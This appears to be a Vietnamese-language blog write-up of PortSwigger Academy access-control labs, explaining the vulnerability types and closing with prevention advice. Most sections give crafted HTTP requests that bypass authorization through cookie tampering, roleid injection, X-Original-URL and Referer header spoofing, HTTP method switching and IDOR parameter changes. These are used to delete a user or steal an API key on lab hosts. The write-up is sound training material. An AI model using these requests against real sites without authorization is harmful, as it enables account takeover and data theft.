---
title: "[PortSwigger Lab] - Access Control Vulneralbilities"
description: Solution of Access Control Vulneralbilities on PortSwigger Lab
date: 2025-06-08 10:27:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, access control]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-08-portswigger-lab-access-control-vulneralbilities/access-control.png
    alt: Access Control Vulneralbilities
---

## Introduction
---
### Access control
**Access control** là cơ chế kiểm soát việc ai hoặc cái gì được phép thực hiện hành động hoặc truy cập vào tài nguyên nào đó. Trong lĩnh vực **web application**, **access control** liên quan chặt chẽ đến:
1. **Authentication (Xác thực):** Xác minh danh tính người dùng — người dùng có đúng là người họ khai báo không?
Ví dụ: đăng nhập bằng username và password.

2. **Session management (Quản lý phiên):** Gắn các request HTTP sau đó với cùng một người dùng đã đăng nhập.
Ví dụ: dùng cookie hoặc token để theo dõi người dùng giữa các lần truy cập.

3. **Access control (Kiểm soát truy cập):** Quyết định người dùng đó có được phép thực hiện hành động cụ thể không.
Ví dụ: người dùng bình thường không được phép xóa tài khoản người khác.

### Type of **access control**

| Loại kiểm soát        | Dựa vào                        | Mục tiêu                              | Ví dụ                             |
| --------------------- | ------------------------------ | ------------------------------------- | --------------------------------- |
| **Vertical**          | Vai trò / cấp bậc              | Phân quyền chức năng                  | Admin vs user                     |
| **Horizontal**        | Danh tính người dùng           | Bảo vệ dữ liệu cá nhân                | User chỉ xem dữ liệu của mình     |
| **Context-dependent** | Trạng thái ứng dụng/người dùng | Bảo vệ logic hoạt động đúng quy trình | Không sửa giỏ hàng sau thanh toán |

## Solve Access Control Vulneralbilities Lab
---
### Lab: Unprotected admin functionality
#### Analysis
- Để tìm được trang admin, ta không thể mò từng cái một được, thông thường sẽ sử dụng tool để tự động hóa quá trình tìm kiếm, ví dụ: **ffuf**, **dirsearch**,...
- Nhiều lập trình viên muốn ngăn **Google** hoặc **Bing** thu thập các trang quản trị, nên đã thêm `Disallow: /administrator-panel` vào `robots.txt`, để hướng dẫn các công cụ tìm kiếm (**crawlers**) như **Googlebot** biết những phần nào không nên thu thập (**index**)

#### Exploit
- Thử truy cập vào `robots.txt` ta thấy được trang admin đã **Disallow**
```
User-agent: *
Disallow: /administrator-panel
```
- Truy cập vào `/administrator-panel` và xóa người dùng `Carlos` 

### Lab: Unprotected admin functionality with unpredictable URL
#### Analysis
- Ở lab này, ứng dụng sử dụng trang admin với kí tự khó đoán, người dùng thông thường sẽ không thấy được
- Nhưng trong source code lại để lộ đường dẫn đến trang admin
#### Exploit
- Inspect code, ta thấy script:
```html
<script>
    var isAdmin = false;
    if (isAdmin) {
        var topLinksTag = document.getElementsByClassName("top-links")[0];
        var adminPanelTag = document.createElement('a');
        adminPanelTag.setAttribute('href', '/admin-4393rt');
        adminPanelTag.innerText = 'Admin panel';
        topLinksTag.append(adminPanelTag);
        var pTag = document.createElement('p');
        pTag.innerText = '|';
        topLinksTag.appendChild(pTag);
    }
</script>
```
- Nếu là admin thì người dùng sẽ tạo thẻ `<a>` liên kết tới trang `/admin-4393rt`
- Truy cập trang `/admin-4393rt` và xóa người dùng `Carlos`

### Lab: User role controlled by request parameter
- Login bằng tài khoản được cấp
- Truy cập tới trang `/admin`, nhận được thông báo:
```
Admin interface only available if logged in as an administrator
```
- Đến **Proxy** > **HTTP History** của **Burp**, tìm đến request `/admin`, nhận thấy có cookie `Admin=false`, gửi lại request với cookie `Admin=true`
- Xóa người dùng carlos bằng cách gửi request:
```http
GET /admin/delete?username=carlos HTTP/2
Host: 0af0007f0345662680b5b23d00680095.web-security-academy.net
Cookie: Admin=true; session=i61bXzmGjYejl2K5qgcEC8zl6zoRXA0o
```

### Lab: User role can be modified in user profile
#### Analysis
- Login bằng tài khoản được cấp
- Truy cập tới trang `/admin`, nhận được thông báo:
```
Admin interface only available if logged in as an administrator
```
- Thực hiện chức năng `change-email`, đến **Proxy** > **HTTP History** của **Burp**, quan sát **request** và **response**
    - Request:

    ```http
POST /my-account/change-email HTTP/2
Host: 0af900d704e013408300739300a10014.web-security-academy.net
...

{"email":"a@gmail.com"}
    ```
    - Response:

    ```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 115

{
"username": "wiener",
"email": "a@gmail.com",
"apikey": "tO9vzcxnFYMqYOk95INOTnWMT5sKti5X",
"roleid": 1
}
    ```

- Quan sát file `/resources/js/changeEmail.js`
```js
function jsonSubmit(formElement, e, changeEmailPath) {
    e.preventDefault();
    var object = {};
    var formData = new FormData(formElement);
    formData.forEach((value, key) => object[key] = value);
    var jsonData = JSON.stringify(object);
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", changeEmailPath, true);
    postRequest.withCredentials = true;
    postRequest.onload = function() {
        if (object["email"]) {
            window.location = postRequest.responseURL;
        }
    }
    postRequest.send(jsonData);
}
```
- Gửi dữ liệu của form dưới dạng `JSON` qua `AJAX` 
- Mặc định chỉ có **email** được gửi
#### Exploit
- Thay đổi `roleid` và gửi trong request `change-email` để trở thành vai trò `admin`
- Gửi request với `roleid` là 2

```http
POST /my-account/change-email HTTP/2
Host: 0af900d704e013408300739300a10014.web-security-academy.net
...

{
    "email":"a@gmail.com",
    "roleid": 2
}
```
- Trở lại trang `/admin` và xóa người dùng `carlos`

### Lab: URL-based access control can be circumvented
- Truy cập vào **Admin panel**, nhận được: `"Access denied"`
- Đến **Proxy** > **HTTP History** của **Burp**, đến request `/admin` và thêm header `X-Original-URL: /admin`, vấn nhận được `"Access denied"`
- Thay đổi request đến `/` và gửi kèm header `X-Original-URL: /admin` => Thành công truy cập **Admin panel**
```http
GET / HTTP/2
Host: 0ad500dd047747aed8da858b00920002.web-security-academy.net
...
X-Original-Url: /admin
```
- View source, lấy request để xóa user `carlos`
```http
GET /?username=carlos HTTP/2
Host: 0ad500dd047747aed8da858b00920002.web-security-academy.net
...
X-Original-Url: /admin/delete
```
- Gửi request với param `username=carlos` và header `X-Original-Url: /admin/delete`

- Nguyên lý hoạt động:
    - **Frontend server** sẽ block các request không phải `admin` đến `/admin`
    - Nhưng **Backend server** lại tin tưởng vào header `X-Original-Url: /admin/delete` 
    - Dù request đến `/`, ứng dụng **backend** sẽ xử lý như `/admin/delete`

> Trong các hệ thống có **reverse proxy** hoặc **URL rewrite** (ví dụ như khi dùng **load balancer** hoặc **nginx**), URL gốc của request có thể bị thay đổi trước khi đến ứng dụng **backend**.
Để giúp ứng dụng biết URL thật sự mà người dùng truy cập, hệ thống có thể gắn thêm header **X-Original-URL**.
{: .prompt-info }

### Lab: Method-based access control can be circumvented
- Đăng nhập bằng tài khoản **admin** 
- Thực hiện chức năng **upgrade** và **downgrade**
- Ta thấy được chức năng **upgrade** được gửi theo method **POST** kèm theo 2 params trong body: `username=carlos&action=upgrade`
- Đăng nhập bằng user **wiener** và gửi lại request **upgrade** với method **POST** nhận được => `"Unauthorized"`
- Thử thay đổi method thành **XNXX** và chuyển param lên trên => thành công
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a2a00b803fa445b804d4eb700f10045.web-security-academy.net
``` 

- Nguyên lý hoạt động:
    - Một số ứng dụng web chỉ áp dụng kiểm soát truy cập cho một số phương thức **HTTP** cụ thể (ví dụ: (**POST**)), và bỏ qua những phương thức khác (ví dụ: **GET**, **PUT**, **HEAD**, **OPTIONS**...) ở **Frontend server** hoặc **Revert proxy** hoặc **WAF**
    - Nhưng nếu **server backend** xử lý cùng một logic cho nhiều phương thức, đây sẽ là điểm sáng cho cuộc tấn công

### Lab: User ID controlled by request parameter 
- Login bằng tài khoản được cấp
- Thay đổi id thành `carlos` và gửi lại request
```http
GET /my-account?id=carlos HTTP/2
Host: 0acf00fc03825e1180893f3300ea0090.web-security-academy.net
```
- Thành công lấy được **apikey** của `carlos`
- Submit apikey
- Nguyên lý hoạt động
    - Do ứng dụng xác thực người dùng thông qua params mà không kiểm soát chặt dựa trên **session cookie**
    - Thuộc nhóm lỗi **IDOR – Insecure Direct Object Reference**

### Lab: User ID controlled by request parameter, with unpredictable user IDs 
- Login bằng tài khoản được cấp
- Ta thấy, ứng dụng đã sài `GUIDs (Globally Unique Identifiers)` cho id mỗi người dùng nên không thể biết chính xác được id của `carlos`
- Thử tìm kiếm trong các blog của `carlos`, ta thấy được có thẻ a chứa id của `carlos` và cả `administrator`
- Lấy id của `carlos` và truy cập
```http
GET /my-account?id=2a9656a5-0c41-41e8-9c10-4fd24f536cc1 HTTP/2
Host: 0a16008704475f5f81196161000f007d.web-security-academy.net
```
- Copy apikey và submit

### Lab: User ID controlled by request parameter with data leakage in redirect 
- Login bằng tài khoản được cấp
- Thay đổi id thành `carlos` và gửi lại request
```http
GET /my-account?id=carlos HTTP/2
Host: 0acf00fc03825e1180893f3300ea0090.web-security-academy.net
```
- Ta thấy response trả lại mới **status code redirect** 302, nhưng vấn chứa apikey của người dùng `carlos`
- Lấy apikey và submit
- Nguyên lý hoạt động: Ứng dụng sẽ xử lý theo kiểu: 
    - Tải dữ liệu 
    - Sau đó mới kiểm tra quyền Và redirect nếu không hợp lệ
    - Render dữ liệu ngoài HTTP 302

### Lab: User ID controlled by request parameter with password disclosure
- Login bằng tài khoản được cấp
- Quan sát thấy password được đặt trong form change-password
```html
    <form class="login-form" action="/my-account/change-password" method="POST">
        <br>
        <label>Password</label>
        <input required="" type="hidden" name="csrf" value="XqxITSY9ttFtdSne1aH2XNzHjdrQN8Je">
        <input required="" type="password" name="password" value="peter">
        <button class="button" type="submit"> Update password </button>
    </form>
```
- Thay đổi id thành `administrator` và gửi lại request
- Lấy password của **admin** và đăng nhập bằng tài khoản `administrator`
- Truy cập **admin panel** và xóa người dùng `carlos`

### Lab: Insecure direct object references
- Login bằng tài khoản được cấp
- Thử chức năng **Live chat** và **View transcript**
- Ta thấy có file được tài về với request
```http
GET /download-transcript/2.txt HTTP/2
Host: 0a18009d04e3712b8194751e00c3007d.web-security-academy.net
```
- Thử thay đổi số 2 thành 1 và gửi lại request
- Ohhh no một đoạn chat sẹt đã được tìm thấy
```text
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is abm4xfrovf12sc31pqiv. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```
- Lấy **password** cả `carlos` và đăng nhập

### Lab: Multi-step process with no access control on one step 
#### Analysis
- Login bằng tài khoản `admin`
- Sử dụng chức năng `change-roles`, thao tác sẽ theo các bước:
    - Change roles
    ```http
POST /admin-roles HTTP/2
Host: 0a09006203ca667a815848bd00ac005b.web-security-academy.net
...
action=upgrade&username=wiener
    ```
    - Confirm change roles
    ```http
POST /admin-roles HTTP/2
Host: 0a09006203ca667a815848bd00ac005b.web-security-academy.net
...
action=upgrade&confirmed=true&username=wiener
    ```
    - Khác nhau ở param confirm

#### Exploit
- Login bằng người dùng `wiener`
- Thực hiện chức năng `change-roles` nhưng chỉ thực hiện ở bước `Confirm change roles`, bỏ qua `Change roles`
```http
POST /admin-roles HTTP/2
Host: 0a09006203ca667a815848bd00ac005b.web-security-academy.net
...
action=upgrade&confirmed=true&username=wiener
```
- Do hệ thống không kiểm soát truy cập ở bước này nên request được chấp nhận.

### Lab: Referer-based access control 
#### Analysis
- Login bằng tài khoản `admin`
- Sử dụng chức năng `change-roles`
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ac600170472214b803694d8009800ab.web-security-academy.net
...
Referer: https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin
...
```
- Ta thấy **header Referer**, thử thay đổi giá trị của nó => `"Unauthorized"`
- Cho thấy server kiểm soát truy cập dựa trên **header Referer** với giá trị `https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin`

#### Exploit
- Login bằng người dùng `wiener`
- Thực hiện chức năng `change-roles` và thêm **header Referer** với giá trị `https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin`
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ac600170472214b803694d8009800ab.web-security-academy.net
...
Referer: https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin
...
```
- Thành công

## Prevent
--- 
1. Never rely on obfuscation alone
- **Vấn đề:** Việc giấu **URL** (như /admin-xyz123) hoặc không hiển thị nút bấm không ngăn người dùng truy cập.
- **Giải pháp:** Luôn phải kiểm tra quyền truy cập ở phía **server**. Nếu user không có quyền, trả về lỗi **403** hoặc chuyển hướng phù hợp.

2. Deny access by default
- **Vấn đề:** Nếu bạn mặc định cho phép, sẽ dễ bỏ sót quyền kiểm soát.
- **Giải pháp:** Mặc định là từ chối tất cả truy cập, chỉ cho phép nếu rõ ràng user có quyền.

3. Use a centralized access control mechanism
- **Vấn đề:** Nếu logic kiểm soát truy cập nằm rải rác, sẽ dễ sai sót.
- **Giải pháp:** Dùng **middleware** hoặc **module** dùng chung để kiểm tra quyền

4. Make access rules explicit in code
- **Vấn đề:** Nếu không rõ quyền nào áp dụng cho **endpoint** nào, sẽ dễ xảy ra lỗi.
- **Giải pháp:** Bắt buộc **developer** khai báo rõ ràng quyền truy cập ở mỗi API hoặc chức năng. Nếu thiếu, báo lỗi trong quá trình **build/test**.

5. Audit and test access control regularly
- **Vấn đề:** Các lỗi về phân quyền thường không dễ phát hiện.
- **Giải pháp:**
        - Rà soát code (code review)
        - Viết test kiểm tra truy cập
        - Dùng công cụ như **Burp Suite** để thử tấn công
        - Thực hiện **pentest** định kỳ hoặc mở chương trình bug bounty

---
Goodluck! 🍀🍀🍀 

